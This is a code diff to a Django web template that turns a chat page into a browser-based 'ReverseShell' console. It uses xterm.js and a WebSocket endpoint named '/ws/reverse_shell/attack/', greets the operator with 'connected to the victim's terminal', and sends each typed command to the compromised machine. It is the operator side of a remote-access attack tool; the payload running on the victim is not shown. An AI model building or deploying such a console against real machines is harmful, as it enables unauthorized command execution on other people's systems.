@@ -1,14 +1,15 @@
 <!DOCTYPE html>
 <html>
 <head>
+    {% load static %}
     <meta charset="utf-8"/>
-    <title>Chat Room</title>
+    <title>ReverseShell</title>
+    <link rel="stylesheet" href="{% static 'node_modules/xterm/css/xterm.css' %}" />
+    <script src="{% static 'node_modules/xterm/lib/xterm.js' %}"></script>
 </head>
 <body>
-    <textarea id="chat-log" cols="100" rows="20"></textarea><br>
-    <input id="chat-message-input" type="text" size="100"><br>
-    <input id="chat-message-submit" type="button" value="Send">
-    <script>
+    <div id="terminal"></div>
+      <script>
         var ws_scheme = window.location.protocol == "https:" ? "wss" : "ws";
         const chatSocket = new WebSocket(
             ws_scheme
@@ -17,30 +18,119 @@
             + '/ws/reverse_shell/attack/'
         );
 
+        var term = new Terminal();
+        term.open(document.getElementById('terminal'));
+        term.resize(180, 50);
+        var command = '';
+        var cursor = 0;
+        var command_history = [];
+        var index = command_history.length;;
+        runFakeTerminal();
+
         chatSocket.onmessage = function(e) {
             const data = JSON.parse(e.data);
-            document.querySelector('#chat-log').value += (data.message + '\n');
+            term.writeln(data.message);
+            term.write('\r\n$ ');
         };
 
         chatSocket.onclose = function(e) {
             console.error('Chat socket closed unexpectedly');
         };
 
-        document.querySelector('#chat-message-input').focus();
-        document.querySelector('#chat-message-input').onkeyup = function(e) {
-            if (e.keyCode === 13) {  // enter, return
-                document.querySelector('#chat-message-submit').click();
+        function runFakeTerminal() {
+            if (term._initialized) {
+                return;
             }
-        };
 
-        document.querySelector('#chat-message-submit').onclick = function(e) {
-            const messageInputDom = document.querySelector('#chat-message-input');
-            const message = messageInputDom.value;
-            chatSocket.send(JSON.stringify({
-                'message': message
+            term._initialized = true;
+
+            term.prompt = () => {
+                term.write('\r\n$ ');
+            };
+
+            term.writeln(" _____                               _____ _          _ _");
+            term.writeln("|  __ \\                             / ____| |        | | |");
+            term.writeln("| |__) |_____   _____ _ __ ___  ___| (___ | |__   ___| | |");
+            term.writeln("|  _  // _ \\ \\ / / _ \\ '__/ __|/ _ \\\\___ \\| '_ \\ / _ \\ | |");
+            term.writeln("| | \\ \\  __/\\ V /  __/ |  \\__ \\  __/____) | | | |  __/ | |");
+            term.writeln("|_|  \\_\\___| \\_/ \\___|_|  |___/\\___|_____/|_| |_|\\___|_|_|");
+            term.writeln('');
+            term.writeln("You are now connected to the victim's terminal.");
+            term.writeln("To quit the program type: 'quit'. You will be redirected to the homepage.");
+            term.writeln('');
+            term.prompt();
+
+            term.onKey(e => {
+                const printable = !e.domEvent.altKey && !e.domEvent.altGraphKey && !e.domEvent.ctrlKey && !e.domEvent.metaKey;
+
+                if (e.domEvent.keyCode === 39) {
+                    if (cursor < command.length) {
+                        term.write(e.key);
+                        cursor += 1;
+                    }
+                } else if (e.domEvent.keyCode === 37) {
+                    if (cursor > 0) {
+                        term.write(e.key);
+                        cursor -= 1;
+                    }
+                } else if (e.domEvent.keyCode === 38) {
+                    if (index > 0) {
+                        index -= 1;
+                    }
+                    command = command_history[index];
+                    // Delete whole line
+                    term.write('\x1b[2K\r');
+                    term.write('$ ' + command);
+                } else if (e.domEvent.keyCode === 40) {
+                    // Delete whole line
+                    term.write('\x1b[2K\r');
+                    if (index < command_history.length - 1) {
+                        index += 1;
+                        command = command_history[index];
+                        term.write('$ ' + command);
+                    } else {
+                        command = '';
+                        term.write('$ ');
+                    }
+                } else if (e.domEvent.keyCode === 13) {
+                    prompt(term);
+                } else if (e.domEvent.keyCode === 8) {
+                    // Do not delete the prompt
+                    if (term._core.buffer.x > 2) {
+                    // Delete whole line
+                    term.write('\x1b[2K\r');
+                    command = command.slice(0, cursor - 1) + command.slice(cursor);
+                    term.write('$ ' + command);
+                    for(i = 0; i <= command.length - cursor; i++) {
+                        term.write('\x1b[D');
+                    }
+                    cursor -= 1;
+                    }
+                } else if (printable) {
+                    data = command.slice(cursor, command.length);
+                    term.write(e.key + data);
+                    for(i = 0; i < command.length - cursor; i++) {
+                        term.write('\x1b[D');
+                    }
+                    command = command.substr(0, cursor) + e.key + command.substr(cursor);
+                    cursor += 1;
+                }
+            });
+        }
+
+        function prompt(term) {
+          term.write('\r\n$ ');
+          // Send command to victim's terminal via websocket.
+          chatSocket.send(JSON.stringify({
+                'message': command
             }));
-            messageInputDom.value = '';
-        };
+          if (command !== '') {
+            command_history.push(command);
+          }
+          index = command_history.length;
+          command = '';
+          cursor = 0;
+        }
     </script>
 </body>
 </html>
